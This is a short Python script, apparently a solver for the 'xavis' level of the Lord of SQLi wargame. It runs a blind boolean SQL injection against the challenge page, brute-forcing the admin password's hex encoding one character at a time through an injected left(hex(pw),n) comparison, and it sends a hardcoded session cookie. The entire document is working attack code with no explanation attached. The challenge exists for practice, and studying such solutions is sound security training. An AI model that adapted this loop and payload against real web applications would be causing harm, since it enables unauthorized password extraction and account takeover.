# LordofSQLi: xavis
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
cookies = {'PHPSESSID': '3ar40fm6337qpc0q15brn47rpk'}
hex_passwd = ''

while True:
    finish = True
    for c in digits + ascii_lowercase:
        payload = {'pw': f"' or id='admin' and left(hex(pw),{len(hex_passwd) + 1})='{hex_passwd + c}"}
        r = requests.get(url, params=payload, cookies=cookies)

        print(c, end='', flush=True)
        if 'Hello admin' in r.text or 'Hello guest' in r.text:
            hex_passwd += c
            finish = False
            print('\n->' + hex_passwd)
            break
    if finish:
        break

print('\n->' + hex_passwd)
